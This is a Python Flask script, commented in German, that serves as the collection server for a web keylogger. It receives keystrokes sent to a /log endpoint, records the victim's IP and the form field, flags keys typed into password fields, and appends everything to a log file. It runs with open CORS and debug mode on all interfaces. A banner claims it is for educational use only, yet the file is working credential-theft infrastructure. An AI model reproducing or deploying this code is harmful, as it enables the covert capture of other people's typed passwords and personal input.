#!/usr/bin/env python3
"""
KEYLOGGER SERVER - BASIERT AUF KOLLEGES FUNKTIONIERENDEM SERVER
"""

from flask import Flask, request
from flask_cors import CORS
from datetime import datetime
import os

app = Flask(__name__)
CORS(app, resources={r"/*": {"origins": "*"}})

KEYLOG_FILE = "keylog.txt"

BANNER = """
╔══════════════════════════════════════════════════════════╗
║                                                          ║
║           ⌨️  KEYLOGGER SERVER GESTARTET ⌨️              ║
║                                                          ║
║  Port: 9999                                              ║
║  Endpoint: /log (GET)                                    ║
║                                                          ║
║  ⚠️  NUR FÜR BILDUNGSZWECKE                              ║
║                                                          ║
╚══════════════════════════════════════════════════════════╝
"""

def log_to_file(filename, message):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(filename, "a", encoding="utf-8") as f:
        f.write(f"[{timestamp}] {message}\n")

@app.route("/log", methods=["GET", "POST"])
def log_keystroke():
    key = request.args.get("k", "")
    field = request.args.get("f", "unknown")
    victim_ip = request.remote_addr

    if key:
        is_password = 'password' in field.lower()
        icon = "🔑" if is_password else "⌨️"
        print(f"{icon} [{datetime.now().strftime('%H:%M:%S')}] [{victim_ip}] [{field:15}] {key}", flush=True)

        log_message = f"IP: {victim_ip} | Field: {field} | Key: {key}"
        log_to_file(KEYLOG_FILE, log_message)

    return "", 200

@app.route("/")
def index():
    return "<h1>⌨️ Keylogger Server - ONLINE</h1>", 200

if __name__ == "__main__":
    print(BANNER)

    if not os.path.exists(KEYLOG_FILE):
        with open(KEYLOG_FILE, "w") as f:
            f.write(f"# Keylogger Log - Erstellt: {datetime.now()}\n")

    print(f"📝 Logdatei: {os.path.abspath(KEYLOG_FILE)}")
    print(f"\n🚀 Server startet...\n")
    print(f"LEGENDE: ⌨️  = Normal | 🔑 = Password-Feld")
    print(f"{'-'*70}\n")

    app.run(
        debug=True,
        host='0.0.0.0',
        port=9999,
        threaded=True
    )
